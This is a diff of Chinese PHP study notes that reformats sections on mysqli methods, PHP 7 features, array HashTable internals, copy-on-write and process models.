 mysqli::get_warnings — Get result of SHOW WARNINGS
+
 mysqli::$info — 返回最近执行的 SQL 语句的信息
+
 mysqli::init — 初始化 MySQLi 并返回一个资源类型的值，这个值可以作为 mysqli_real_connect() 函数的传入参数
+
 mysqli::$insert_id — 返回最后一条插入语句产生的自增 ID
+
 mysqli::kill — 让服务器杀掉一个 MySQL 线程
+
 mysqli::more_results — 检查批量查询中是否还有查询结果
+
 mysqli::multi_query — 执行查询
+
 mysqli::next_result — 为读取 multi_query 执行之后的下一个结果集做准备
+
 mysqli::options — 设置选项
+
 mysqli::ping — ping 一个连接，或者如果连接处于断开状态，重新连接
+
 mysqli::poll — 轮询连接
+
 mysqli::prepare — 准备执行一个 SQL 语句
+
 mysqli::query — 对数据库执行一次查询
+
 mysqli::real_connect — 建立一个 MySQL 服务器连接
+
 mysqli::real_escape_string — 根据当前连接的字符集，对于 SQL 语句中的特殊字符进行转义
+
 mysqli::real_query — 执行一个mysql查询
+
 mysqli::reap_async_query — 获取异步查询的结果
+
 mysqli::refresh — 刷新
+
 mysqli::release_savepoint — 从当前事务的保存点中移除一个命名保存点
+
 mysqli::rollback — 回退当前事务
+
 mysqli::rpl_query_type — 返回 RPL 查询类型
+
 mysqli::savepoint — 在当前事务中增加一个命名保存点
+
 mysqli::select_db — 选择用于数据库查询的默认数据库
+
 mysqli::send_query — 发送请求并返回结果
+
 mysqli::set_charset — 设置默认字符编码
+
 mysqli::set_local_infile_default — 取消用户指定的回调函数
+
 mysqli::set_local_infile_handler — 设置 LOAD DATA LOCAL INFILE 命令的回调函数
+
 mysqli::$sqlstate — 返回上一次 SQL 操作的 SQLSTATE 错误信息
+
 mysqli::ssl_set — 使用 SSL 建立到数据库之间的安全连接
+
 mysqli::stat — 获取当前系统状态信息
+
 mysqli::stmt_init — 初始化一条语句并返回一个用于mysqli_stmt_prepare(调用)的对象
+
 mysqli::store_result — 转移上一次查询返回的结果集
+
 mysqli::$thread_id — 返回当前连接的线程 ID
+
 mysqli::thread_safe — 返回是否是线程安全的
+
 mysqli::use_result — Initiate a result set retrieval
+
 mysqli::$warning_count — Returns the number of warnings from the last query for the given link
+
 MySQLi_STMT — MySQLi_STMT类
+
 mysqli_stmt::$affected_rows — Returns the total number of rows changed, deleted, or inserted by the last executed statement
+
 mysqli_stmt::attr_get — Used to get the current value of a statement attribute
+
 mysqli_stmt::attr_set — Used to modify the behavior of a prepared statement
+
 mysqli_stmt::bind_param — Binds variables to a prepared statement as parameters
+
 mysqli_stmt::bind_result — Binds variables to a prepared statement for result storage
+
 mysqli_stmt::close — Closes a prepared statement
+
 mysqli_stmt::__construct — Constructs a new mysqli_stmt object
+
 mysqli_stmt::data_seek — Seeks to an arbitrary row in statement result set
+
 mysqli_stmt::$errno — Returns the error code for the most recent statement call
+
 mysqli_stmt::$error_list — Returns a list of errors from the last statement executed
+
 mysqli_stmt::$error — Returns a string description for last statement error
+
 mysqli_stmt::execute — Executes a prepared Query
+
 mysqli_stmt::fetch — Fetch results from a prepared statement into the bound variables
+
 mysqli_stmt::$field_count — Returns the number of field in the given statement
+
 mysqli_stmt::free_result — Frees stored result memory for the given statement handle
+
 mysqli_stmt::get_result — Gets a result set from a prepared statement
+
 mysqli_stmt::get_warnings — Get result of SHOW WARNINGS
+
 mysqli_stmt::$insert_id — Get the ID generated from the previous INSERT operation
+
 mysqli_stmt::more_results — Check if there are more query results from a multiple query
+
 mysqli_stmt::next_result — Reads the next result from a multiple query
+
 mysqli_stmt::$num_rows — Return the number of rows in statements result set
+
 mysqli_stmt::$param_count — Returns the number of parameter for the given statement
+
 mysqli_stmt::prepare — Prepare an SQL statement for execution
+
 mysqli_stmt::reset — Resets a prepared statement
+
 mysqli_stmt::result_metadata — Returns result set metadata from a prepared statement
+
 mysqli_stmt::send_long_data — Send data in blocks
+
 mysqli_stmt::$sqlstate — Returns SQLSTATE error from previous statement operation
+
 mysqli_stmt::store_result — Transfers a result set from a prepared statement
+
 mysqli_result — mysqli_result类
+
 mysqli_result::$current_field — Get current field offset of a result pointer
+
 mysqli_result::data_seek — Adjusts the result pointer to an arbitrary row in the result
+
 mysqli_result::fetch_all — Fetches all result rows as an associative array, a numeric array, or both
+
 mysqli_result::fetch_array — Fetch a result row as an associative, a numeric array, or both
+
 mysqli_result::fetch_assoc — Fetch a result row as an associative array
+
 mysqli_result::fetch_field_direct — Fetch meta-data for a single field
+
 mysqli_result::fetch_field — Returns the next field in the result set
+
 mysqli_result::fetch_fields — Returns an array of objects representing the fields in a result set
+
 mysqli_result::fetch_object — Returns the current row of a result set as an object
+
 mysqli_result::fetch_row — Get a result row as an enumerated array
+
 mysqli_result::$field_count — Get the number of fields in a result
+
 mysqli_result::field_seek — Set result pointer to a specified field offset
+
 mysqli_result::free — Frees the memory associated with a result
+
 mysqli_result::$lengths — Returns the lengths of the columns of the current row in the result set
+
 mysqli_result::$num_rows — Gets the number of rows in a result
+
 MySQLi_Driver — MySQLi_Driver类
+
 mysqli_driver::embedded_server_end — Stop embedded server
+
 mysqli_driver::embedded_server_start — Initialize and start embedded server
+
 mysqli_driver::$report_mode — Enables or disables internal report functions
+
 MySQLi_Warning — MySQLi_Warning类
+
 mysqli_warning::__construct — The __construct purpose
+
 mysqli_warning::next — Fetch next warning
+
 mysqli_sql_exception — mysqli异常类
+
 别名和过时的 Mysqli 函数
+
 mysqli_bind_param — mysqli_stmt_bind_param 的别名
+
 mysqli_bind_result — mysqli_stmt_bind_result 的别名
+
 mysqli_client_encoding — mysqli_character_set_name 的别名
+
 mysqli_connect — 别名 mysqli::__construct
+
 mysqli::disable_reads_from_master — 在主从服务器结构中，禁用从主机读取数据
+
 mysqli_disable_rpl_parse — 禁用RPL解析
+
 mysqli_enable_reads_from_master — 开启从主机读取
+
 mysqli_enable_rpl_parse — 开启RPL解析
+
 mysqli_escape_string — 别名 mysqli_real_escape_string
+
 mysqli_execute — mysqli_stmt_execute 的别名
+
 mysqli_fetch — mysqli_stmt_fetch 的别名。
+
 mysqli_get_cache_stats — 返回客户端Zval缓存统计信息
+
 mysqli_get_client_stats — 返回客户端进程统计信息
+
 mysqli_get_links_stats — 返回打开和缓存的链接相关信息
+
 mysqli_get_metadata — mysqli_stmt_result_metadata 的别名
+
 mysqli_master_query — 在主/从机制中强制在主机中执行一个查询
+
 mysqli_param_count — mysqli_stmt_param_count 的别名
+
 mysqli_report — 别名 mysqli_driver->report_mode
+
 mysqli_rpl_parse_enabled — 检查是否开启了 RPL 解析
+
 mysqli_rpl_probe — RPL 探测
+
 mysqli_send_long_data — mysqli_stmt_send_long_data 的别名
+
 mysqli::set_opt — Alias of mysqli_options
+
 mysqli_slave_query — 在主/从机制中强制在从机上执行一个查询
-```
 
 ### php7
-```
-[php7新特性
-http://www.runoob.com/w3cnote/php7-new-features.html
-PHP 7 新特性
-分类 PHP 常用实例
-标量类型声明
-PHP 7 中的函数的形参类型声明可以是标量了。在 PHP 5 中只能是类名、接口、array 或者 callable (PHP 5.4，即可以是函数，包括匿名函数)，现在也可以使用 string、int、float和 bool 了。
 
+php7新特性
+
+http://www.runoob.com/w3cnote/php7-new-features.html
+
+PHP 7 新特性
+
+分类 PHP 常用实例
+
+标量类型声明
+
+PHP 7 中的函数的形参类型声明可以是标量了。在 PHP 5 中只能是类名、接口、array 或者 callable (PHP 5.4，即可以是函数，包括匿名函数)，现在也可以使用 string、int、float和 bool 了。
+```
 <?php
 // 强制模式
 function sumOfInts(int ...$ints)
@@ -21405,13 +21080,14 @@ var_dump(sumOfInts(2, '3', 4.1));
 以上实例会输出：
 
 int(9)
+```
 需要注意的是上文提到的严格模式的问题在这里同样适用：强制模式（默认，既强制类型转换）下还是会对不符合预期的参数进行强制类型转换，严格模式下则触发 TypeError 的致命错误。
 
 返回值类型声明
+
 PHP 7 增加了对返回类型声明的支持。 类似于参数类型声明，返回类型声明指明了函数返回值的类型。可用的类型与参数声明中可用的类型相同。
-
+```
 <?php
-
 function arraysSum(array ...$arrays): array
 {
     return array_map(function(array $array): int {
@@ -21428,9 +21104,11 @@ Array
     [1] => 15
     [2] => 24
 )
+```
 NULL 合并运算符
-由于日常使用中存在大量同时使用三元表达式和 isset()的情况，NULL 合并运算符使得变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。
 
+由于日常使用中存在大量同时使用三元表达式和 isset()的情况，NULL 合并运算符使得变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。
+```
 实例如下：
 
 <?php
@@ -21439,9 +21117,11 @@ $username = $_GET['user'] ?? 'nobody';
 // 类似的三元运算符
 $username = isset($_GET['user']) ? $_GET['user'] : 'nobody';
 ?>
+```
 太空船操作符（组合比较符）
-太空船操作符用于比较两个表达式。当$a大于、等于或小于$b时它分别返回-1、0或1。
 
+太空船操作符用于比较两个表达式。当$a大于、等于或小于$b时它分别返回-1、0或1。
+```
 实例如下：
 
 <?php
@@ -21460,7 +21140,9 @@ echo "a" <=> "a"; // 0
 echo "a" <=> "b"; // -1
 echo "b" <=> "a"; // 1
 ?>
+```
 通过 define() 定义常量数组
+```
 实例如下：
 
 <?php
@@ -21472,9 +21154,11 @@ define('ANIMALS', [
 
 echo ANIMALS[1]; // 输出 "cat"
 ?>
+```
 匿名类
-现在支持通过new class 来实例化一个匿名类，实例如下：
 
+现在支持通过new class 来实例化一个匿名类，实例如下：
+```
 <?php
 interface Logger {
     public function log(string $msg);
@@ -21505,9 +21189,11 @@ var_dump($app->getLogger());
 
 object(class@anonymous)#2 (0) {
 }
+```
 Unicode codepoint 转译语法
-这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。
 
+这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。
+```
 echo "\u{aa}";
 echo "\u{0000aa}";
 echo "\u{9999}";
@@ -21516,9 +21202,12 @@ echo "\u{9999}";
 ª
 ª (same as before but with optional leading 0's)
 香
-Closure::call()
-Closure::call() 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。
+```
 
+Closure::call()
+
+Closure::call() 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。
+```
 <?php
 class A {private $x = 1;}
 
@@ -21531,25 +21220,22 @@ echo $getX();
 $getX = function() {return $this->x;};
 echo $getX->call(new A);
 以上实例会输出：
+```
 
-1
-1
 为unserialize()提供过滤
 这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。
-
+```
 <?php
-
 // 转换对象为 __PHP_Incomplete_Class 对象
 $data = unserialize($foo, ["allowed_classes" => false]);
-
 // 转换对象为 __PHP_Incomplete_Class 对象，除了 MyClass 和 MyClass2
 $data = unserialize($foo, ["allowed_classes" => ["MyClass", "MyClass2"]);
-
 // 默认接受所有类
 $data = unserialize($foo, ["allowed_classes" => true]);
+```
 IntlChar
 新增加的 IntlChar 类旨在暴露出更多的 ICU 功能。这个类自身定义了许多静态方法用于操作多字符集的 unicode 字符。
-
+```
 <?php
 printf('%x', IntlChar::CODEPOINT_MAX);
 echo IntlChar::charName('@');
@@ -21560,10 +21246,11 @@ var_dump(IntlChar::ispunct('!'));
 COMMERCIAL AT
 bool(true)
 若要使用此类，请先安装Intl扩展
-
+```
 预期
-预期是向后兼用并增强之前的 assert() 的方法。 它使得在生产环境中启用断言为零成本，并且提供当断言失败时抛出特定异常的能力。
 
+预期是向后兼用并增强之前的 assert() 的方法。 它使得在生产环境中启用断言为零成本，并且提供当断言失败时抛出特定异常的能力。
+```
 <?php
 ini_set('assert.exception', 1);
 
@@ -21574,9 +21261,11 @@ assert(false, new CustomError('Some error message'));
 以上实例会输出：
 
 Fatal error: Uncaught CustomError: Some error message
+```
 use 加强
-从同一 namespace 导入的类、函数和常量现在可以通过单个 use 语句 一次性导入了。
 
+从同一 namespace 导入的类、函数和常量现在可以通过单个 use 语句 一次性导入了。
+```
 <?php
 
 //  PHP 7 之前版本用法
@@ -21597,12 +21286,12 @@ use some\namespace\{ClassA, ClassB, ClassC as C};
 use function some\namespace\{fn_a, fn_b, fn_c};
 use const some\namespace\{ConstA, ConstB, ConstC};
 ?>
+```
 Generator 加强
+
 增强了Generator的功能，这个可以实现很多先进的特性
-
+```
 <?php
-<?php
-
 function gen()
 {
     yield 1;
@@ -21623,10 +21312,13 @@ foreach (gen() as $val)
 }
 
 ?>
+```
 以上实例会输出：
-整除
-新增了整除函数 intdiv(),使用实例：
 
+整除
+
+新增了整除函数 intdiv(),使用实例：
+```
 <?php
 var_dump(intdiv(10, 3));
 ?>
@@ -21636,10 +21328,9 @@ int(3)
 ```
 
 ### PHP 数组底层实现 （HashTable + Linked list）
-```
 https://zhuanlan.zhihu.com/p/97762122
-数组在 PHP 中非常强大、灵活的一种数据类型，和 Java、C 等静态语言不同，我们在初始化 PHP 数组的时候不必指定大小和存储数据的类型，在赋值的时候可以通过数字索引，也可以通过字符串索引的方式：
 
+数组在 PHP 中非常强大、灵活的一种数据类型，和 Java、C 等静态语言不同，我们在初始化 PHP 数组的时候不必指定大小和存储数据的类型，在赋值的时候可以通过数字索引，也可以通过字符串索引的方式：
 
 基于 PHP 数组的强大特性，我们可以轻易实现更加复杂的数据结构，比如栈、队列、列表、集合、字典等。PHP 数组功能之所以如此强大，得益于底层基于散列表实现。
 
@@ -21647,27 +21338,29 @@ PHP数组底层数据结构
 
 PHP 数组底层依赖的散列表数据结构定义如下（位于 Zend/zend_types.h）：
 
-
 这个散列表中有很多成员，我们挑几个比较重要的来讲讲：
 
 arData：散列表中保存存储元素的数组，其内存是连续的，arData指向数组的起始位置；
+
 nTableSize：数组的总容量，即可以容纳的元素数，arData 的内存大小就是根据这个值确定的，它的大小的是2的幂次方，最小为8，然后按照 8、16、32...依次递增；
+
 nTableMask：这个值在散列函数根据 key 的哈希值映射元素的时候用到，它的值实际就是 nTableSize 的负数，即 nTableMask = -nTableSize，用位运算来表示就是 nTableMask = ~nTableSize+1；
+
 nNumUsed、nNumOfElements：nNumUsed 是指数组当前使用的 Bucket 数，但不是数组有效元素个数，因为某个数组元素被删除后并没有立即从数组中删除，而是将其标记为 IS_UNDEF，只有在数组需要扩容时才会真正删除，nNumOfElements 则表示数组中有效的元素数量，即调用 count 函数返回值，如果没有扩容，nNumUsed 一直递增，无论是否删除元素；
+
 nNextFreeElement：这个是给自动确定数值索引使用的，默认从 0 开始，比如 $arr[] = 200，这个时候 nNextFreeElement 值会自动加 1；
+
 pDestructor：当删除或覆盖数组中的某个元素时，如果提供了这个函数句柄，则在删除或覆盖时调用此函数，对旧元素进行清理；
+
 u：这个联合体结构主要用于一些辅助作用
+
 Bucket 的结构比较简单，主要用来保存元素的 key 和 value，以及一个整型的 h（散列值，或者叫哈希值）：如果元素是数值索引，则其值就是数值索引的值；如果是字符串索引，那么其值就是 key 通过 Time33 算法计算得到的散列值，h 的值用来最终映射元素的存储位置。Bucket 的数据结构如下：
-
-
-
 
 PHP 数组的基本实现
 
 散列表主要由两部分组成：存储元素数组、散列函数。散列表的基本实现前面已经探讨过，PHP 中的数组除了具备散列表的基本特点之外，还有一个特别的地方，那就是它是有序的（与Java中的HashMap的无序有所不同）：数组中各元素的顺序和插入顺序一致。这个是怎么实现的呢？
 
 为了实现 PHP 数组的有序性，PHP 底层的散列表在散列函数与元素数组之间加了一层映射表，这个映射表也是一个数组，大小和存储元素的数组相同，存储元素的类型为整型，用于保存元素在实际存储的有序数组中的下标 —— 元素按照先后顺序依次插入实际存储数组，然后将其数组下标按照散列函数散列出来的位置存储在新加的映射表中：
-
 
 这样，就可以完成最终存储数据的有序性了。
 
@@ -21677,15 +21370,12 @@ PHP 数组底层结构中并没有显式标识这个中间映射表，而是与 
 
 数组的初始化主要是针对 HashTable 成员的设置，初始化时并不会立即分配 arData 的内存，插入第一个元素之后才会分配 arData 的内存。初始化操作可以通过 zend_hash_init 宏完成，最后由 _zend_hash_init_int 函数处理（该函数定义在 Zend/zend_hash.c 文件中）：
 
-
-
-
 此时的 HashTable 只是设置了散列表的大小及其他成员的初始值，还无法用来存储元素。
 
 插入数据
 
 插入时会检查数组是否已经分配存储空间，因为初始化并没有实际分配 arData 的内存，在第一次插入时才会根据 nTableSize 的大小分配，分配以后会把 HashTable->u.flags 打上 HASH_FLAG_INITIALIZED 掩码，这样，下次插入时发现已经分配了就不会重复操作，这段检查逻辑位于 _zend_hash_add_or_update_i 函数中：
-
+```
 if (UNEXPECTED(!(HT_FLAGS(ht) & HASH_FLAG_INITIALIZED))) {
     zend_hash_real_init_mixed(ht);
     if (!ZSTR_IS_INTERNED(key)) {
@@ -21695,13 +21385,10 @@ if (UNEXPECTED(!(HT_FLAGS(ht) & HASH_FLAG_INITIALIZED))) {
     }
     goto add_to_hash;
 }
+```
 如果 arData 还没有分配，则最终由 zend_hash_real_init_mixed_ex 完成内存分配：
 
-
-
-
 分配完 arData 的内存后就可以进行插入操作了，插入时先将元素按照顺序插入 arData，然后将其在 arData 数组中的位置存储到根据 key 的散列值与 nTableMask 计算得到的中间映射表中的对应位置：
-
 
 上述只是最基本的插入处理，不涉及已存在数据的覆盖和清理。
 
@@ -21710,13 +21397,13 @@ if (UNEXPECTED(!(HT_FLAGS(ht) & HASH_FLAG_INITIALIZED))) {
 PHP 数组底层的散列表采用链地址法解决哈希冲突，即将冲突的 Bucket 串成链表。
 
 HashTable 中的 Bucket 会记录与它冲突的元素在 arData 数组中的位置，这也是一个链表，冲突元素的保存位置不在 Bucket 结构中，而是保存在了存储元素 zval 的 u2 结构中，即 Bucket.val.u2.next，所以插入时分为以下两步：
-
+```
 // 将映射表中原来的值保存到新 Bucket 中，哈希冲突时会用到（以链表方式解决哈希冲突）
 Z_NEXT(p->val) = HT_HASH_EX(arData, nIndex);
 // 再把新元素数组存储位置更新到数据表中
 // 保存idx：((unit32_t*))(ht->arData)[nIndex] = idx
 HT_HASH_EX(arData, nIndex) = HT_IDX_TO_HASH(idx);
-
+```
 
 数组查找
 
@@ -21724,54 +21411,44 @@ HT_HASH_EX(arData, nIndex) = HT_IDX_TO_HASH(idx);
 
 对应的底层源码如下：
 
-
 删除数据
 
 关于数组数据删除前面我们在介绍散列表中的 nNumUsed 和 nNumOfElements 字段时已经提及过，从数组中删除元素时，并没有真正移除，并重新 rehash，而是当 arData 满了之后，才会移除无用的数据，从而提高性能。即数组在需要扩容的情况下才会真正删除元素：首先检查数组中已删除元素所占比例，如果比例达到阈值则触发重新构建索引的操作，这个过程会把已删除的 Bucket 移除，然后把后面的 Bucket 往前移动补上空位，如果还没有达到阈值则会分配一个原数组大小 2 倍的新数组，然后把原数组的元素复制到新数组上，最后重建索引，重建索引会将已删除的 Bucket 移除。
 
 对应底层代码如下：
 
-
 除此之外，数组还有很多其他操作，比如复制、合并、销毁、重置等，这些操作对应的代码都位于 zend_hash.c 中，感兴趣的同学可以去看看。
 
 https://www.jb51.net/article/168406.htm
+
 PHP 的数组是一种非常强大灵活的数据类型，在讲它的底层实现之前，先看一下 PHP 的数组都具有哪些特性。
 
 可以使用数字或字符串作为数组健值
-
-1
+```
 $arr = [1 => 'ok', 'one' => 'hello'];
+```
 可按顺序读取数组
-
-1
-2
-3
+```
 foreach($arr as $key => $value){
  echo $arr[$key];
 }
+```
 可随机读取数组中的元素
-1
-2
-3
-4
-5
+```
 $arr = [1 => 'ok', 'one' => 'hello', 'a' => 'world'];
  
 echo $arr['one'];
  
 echo current($arr);
+```
 数组的长度是可变的
-
-1
-2
-3
-4
-5
+```
 $arr = [1, 2, 3];
  
 $arr[] = 4;
  
 array_push($arr, 5);
+```
 正是基于这些特性，我们可以使用 PHP 中的数组轻易的实现集合、栈、列表、字典等多种数据结构。那么这些特性在底层是如何实现的呢？ 这就得从数据结构说起了。
 
 数据结构
@@ -21780,31 +21457,7 @@ PHP 中的数组实际上是一个有序映射。映射是一种把 values 关�
 PHP 数组的底层实现是散列表（也叫 hashTable )，散列表是根据键（Key）直接访问内存存储位置的数据结构，它的key - value 之间存在一个映射函数，可以根据 key 通过映射函数得到的散列值直接索引到对应的 value 值，无需通过关键字比较，在理想情况下，不考虑散列冲突，散列表的查找效率是非常高的，时间复杂度是 O(1)。
 
 从源码中我们可以看到 zend_array 的结构如下：
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
+```
 typedef struct _zend_array zend_array;
 typedef struct _zend_array hashTable;
  
@@ -21829,36 +21482,33 @@ struct _zend_array {
   zend_long     nNextFreeElement; // 下一个可用的数值索引,如:arr[] = 1;arr["a"] = 2;arr[] = 3; 则nNextFreeElement = 2;
   dtor_func_t    pDestructor;
 };
+```
 该结构中的 Bucket 即储存元素的数组，arData 指向数组的起始位置，使用映射函数对 key 值进行映射后可以得到偏移值，通过内存起始位置 + 偏移值即可在散列表中进行寻址操作。
 
 Bucket 的数据结构如下：
-
-1
-2
-3
-4
-5
+```
 typedef struct _Bucket {
   zval       val; // 存储的具体 value，这里是一个 zval，而不是一个指针
   zend_ulong    h;  // 数字 key 或字符串 key 的哈希值。用于查找时 key 的比较  
   zend_string   *key; // 当 key 值为字符串时，指向该字符串对应的 zend_string（使用数字索引时该值为 NULL），用于查找时 key 的比较
 } Bucket;
+```
 到这里有个问题出现了：存储在散列表里的元素是无序的，PHP 数组如何做到按顺序读取的呢？
 
 答案是中间映射表，为了实现散列表的有序性，PHP 为其增加了一张中间映射表，该表是一个大小与 Bucket 相同的数组，数组中储存整形数据，用于保存元素实际储存的 Value 在 Bucekt 中的下标。Bucekt 中的数据是有序的，而中间映射表中的数据是无序的。
 
-
-
 而通过映射函数映射后的散列值要在中间映射表的区间内，这就对映射函数提出了要求。
 
 映射函数
-PHP7 数组采用的映射方式：
 
-1
+PHP7 数组采用的映射方式：
+```
 nIndex = h | ht->nTableMask;
+```
 将 key 经过 time33 算法生成的哈希值 h 和 nTableMask 进行或运算即可得出映射表的下标，其中 nTableMask 数值为 nTableSize 的负数。并且由于 nTableSize 的值为 2 的幂次方，所以 nTableMask 二进制位右侧全部为 0，保证了 h | ht->nTableMask 的取值范围会在 [-nTableSize, -1] 之间，正好在映射表的下标范围内。另外，用按位或运算的方法和其他方法如取余的方法相比运算速度较高，这个映射函数可以说设计的非常巧妙了。
 
 散列（哈希）冲突
+
 不同键名的通过映射函数计算得到的散列值有可能相同，此时便发生了散列冲突。
 
 对于散列冲突有以下 4 种常用方法：
@@ -21878,6 +21528,7 @@ nIndex = h | ht->nTableMask;
 当我们访问 $arr['key'] 的过程中，假设首先通过散列运算得出映射表下标为 -2 ，然后访问映射表发现其内容指向 arData 数组下标为 1 的元素。此时我们将该元素的 key 和要访问的键名相比较，发现两者并不相等，则该元素并非我们所想访问的元素，而元素的 zval.u2.next 保存的值正是另一个具有相同散列值的元素对应 arData 数组的下标，所以我们可以不断通过 zval.u2.next 的值遍历直到找到键名相同的元素。
 
 扩容
+
 PHP 的数组在底层实现了自动扩容机制，当插入一个元素且没有空闲空间时，就会触发自动扩容机制，扩容后再执行插入。
 
 扩容的过程为：
@@ -21887,14 +21538,14 @@ PHP 的数组在底层实现了自动扩容机制，当插入一个元素且没�
 如果未达到阈值，PHP 则会申请一个大小是原数组两倍的新数组，并将旧数组中的数据复制到新数组中，因为数组长度发生了改变，所以 key-value 的映射关系需要重新计算，这个步骤为重建索引。
 
 重建散列表
+
 在删除某一个数组元素时，会先使用标志位对该元素进行逻辑删除，即在删除 value 时只是将 value 的 type 设置为 IS_UNDEF，而不会立即删除该元素所在的 Bucket，因为如果每次删除元素立刻删除 Bucket 的话，每次都需要进行排列操作，会造成不必要的性能开销。
 
 所以，当删除元素达到一定数量或扩容后都需要重建散列表，即移除被标记为删除的 value。因为 value 在 Bucket 位置移动了或哈希数组 nTableSize 变化了导致 key 与 value 的映射关系改变，重建过程就是遍历 Bucket 数组中的 value，然后重新计算映射值更新到散列表。
-```
 
 ### Copy on write 原理，何时 GC
-```
 https://www.jb51.net/article/50079.htm
+
 什么是写时复制（Copy On Write）？
 
 答：在复制一个对象的时候并不是真正的把原先的对象复制到内存的另外一个位置上，而是在新对象的内存映射表中设置一个指针，指向源对象的位置，并把那块内存的Copy-On-Write位设置为1.这样，在对新的对象执行读操作的时候，内存数据不发生任何变动，直接执行读操作；而在对新的对象执行写操作时，将真正的对象复制到新的内存地址中，并修改新对象的内存映射表指向这个新的位置，并在新的内存位置上执行写操作。
@@ -21904,7 +21555,7 @@ https://www.jb51.net/article/50079.htm
 在PHP 内核中同样使用了写时复制机制来避免在赋值时导致内存增加，比如我们在使用foreach循环体时，可以发现其中的奥秘，示例代码：
 
 复制代码代码如下:
-
+```
 $m1 = memory_get_usage();
 $str=<<<EOF
 aaaaaaaaaaaaaa
@@ -21919,10 +21570,11 @@ foreach($arr as $v){
 }
 $m2 = memory_get_usage();
 echo $m2-$m1;
+```
 当我们执行此代码时会得到内存占用为：788
 
 复制代码代码如下:
-
+```
 $m1 = memory_get_usage();
 $str=<<<EOF
 aaaaaaaaaaaaaa
@@ -21938,9 +21590,10 @@ $v='aaaaaaaaaaaaaa';
 $m2 = memory_get_usage();
 echo $m2-$m1;
 当我们取消 //$v='aaaaaaaaaaaaaa';  的注释，此时内存占用数值为：840，注意内存增长了。
+```
 
 复制代码代码如下:
-
+```
 $m1 = memory_get_usage();
 $str=<<<EOF
 aaaaaaaaaaaaaa
@@ -21955,6 +21608,7 @@ $count++;
 }
 $m2 = memory_get_usage();
 echo $m2-$m1;
+```
 当我们将foreach中的$v 改写为 &$v 时，不管是否注释循环体中对$v的注释，我们都可以得到内存占用为：788
 
 这里就说明了COW机制的介入，当我们在foreach循环中纯粹的只用到对$v 的读操作时，PHP内核会将$v这个变量的内存地址指向到$arr中数组这一索引的内存地址，并没有将数组中的数据复制一份给到变量$v，此时内存占用情况和使用&$v 是一样的。但当我们在循环体内对$v进行写操作时，写时复制机制就被激活了，此时PHP会重新开辟一段内存空间给到$v变量，而将原先$v指向数组的内存地址给断开了，此时内存必然就会增长了。
@@ -21962,34 +21616,36 @@ echo $m2-$m1;
 这里可以得出另外一个结论：当我们在读取大数据的时候，要注意COW机制引入的内存增长影响，同样避免不必要的对变量写，可以提高代码运行性能。
 
 https://segmentfault.com/a/1190000014024336
-PHP写时复制（Copy On Write）
-php
-发布于 2018-03-27
-从一个例子说起：
 
+PHP写时复制（Copy On Write）
+从一个例子说起：
+```
 <?php
 $foo = 1;
 $bar = $foo;
 echo $foo + $bar;
+```
 变量 $foo 赋值给变量 $bar，这两个变量具有相同的值，没有必要新申请内存空间，他们可以共享同一块内存。在很多场景下PHP 的 COW 对内存进行优化。比如：变量的多次赋值、函数参数传递，并在函数体内修改实参等。
 
 什么是“复制”
 这是一段摘自鸟哥博客的例子，说的比较清楚，就直接贴过来了。
-
+```
 <?php
    $var = "laruence";
    $var_dup = $var;
    $var = 1;
 ?>
+```
 很明显在这段代码执行以后，$var_dup 的值应该还是”laruence”, 那么这又是怎么实现的呢？这就是 PHP 的 copy on write 机制：
 
 PHP 在修改一个变量以前，会首先查看这个变量的 refcount，如果 refcount 大于1，PHP 就会执行一个分离的例程， 对于上面的代码，当执行到第三行的时候，PHP 发现 $var 指向的 zval 的 refcount 大于1，那么 PHP 就会复制一个新的 zval 出来，将原 zval 的 refcount 减 1，并修改 symbol_table，使得 $var 和 $var_dup 分离(Separation)。这个机制就是所谓的 copy on write(写时复制)。
 
 写时复制应用场景
+
 写时复制（Copy on Write，也缩写为COW)的应用场景非常多， 比如Linux中对进程复制中内存使用的优化，在各种编程语言中，如C++的STL等等中均有类似的应用。 COW是常用的优化手段，可以归类于：资源延迟分配。只有在真正需要使用资源时才占用资源， 写时复制通常能减少资源的占用。
 
 一个证明 PHP COW 优化内存占用的例子：
-
+```
 <?php
 $j = 1;
 var_dump(memory_get_usage());
@@ -22011,9 +21667,11 @@ int(630904)
 int(10479840)
 int(10479944)
 int(10480040)
+```
 内存并没有显著提高。
 
 “写时复制”的原理
+
 多个相同值的变量共用同一块内存的确节省了内存空间，但变量的值是会发生变化的，如果在上面的例子中， 指向同一内存的值发生了变化（或者可能发生变化），就需要将变化的值“分离”出去，这个“分离”的操作， 就是“复制”。
 
 在PHP中，Zend引擎为了区别同一个zval地址是否被多个变量共享，引入了ref_count和is_ref两个变量进行标识：
@@ -22032,37 +21690,12 @@ clipboard.png
 
 讲堂报名地址：https://segmentfault.com/l/15...
 
-PHP笔试面试题精选（二）
-课程简述
-《PHP笔试面试题精选》课程系列分享关于 PHP 笔试面试会问到的一些问题和知识点，围绕 PHP、数据库、计算机网络、计算机操作系统、设计模式、WEB安全等多个方面进行。
-
-课程内容
-由于涉及到的问题和知识点比较多，本期主要讲 PHP基础、WEB安全、计算机网络三个方面有关的问题。
-
-PHP基础方面
-PSR规范
-PHP新特性
-PHP_FPM性能调优
-Session垃圾回收机制
-WEB安全
-XSS攻击原理和防范
-CSRF攻击原理和防范
-SQL注入攻击防范
-密码哈希
-计算机网络
-HTTP协议
-TCP/IP协议
-WebSocket连接过程
-
-```
-
 ### PHP 进程模型，进程通讯方式，进程线程区别
-```
+
 http://www.gxlcms.com/PHPjiqiao-378142.html
+
 PHP进程模型、进程通讯方式、进程线程的区别分别有哪些？
 PHP进程模型是一个正在执行的程序，可以分配给处理器并由处理器执行的一个实体；PHP进程通讯方式有管道及有名管道，信号，共享内存等；PHP进程线程的区别有进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元等。
-
-
 
 PHP进程模型、进程通讯方式、进程线程的区别分别是：
 
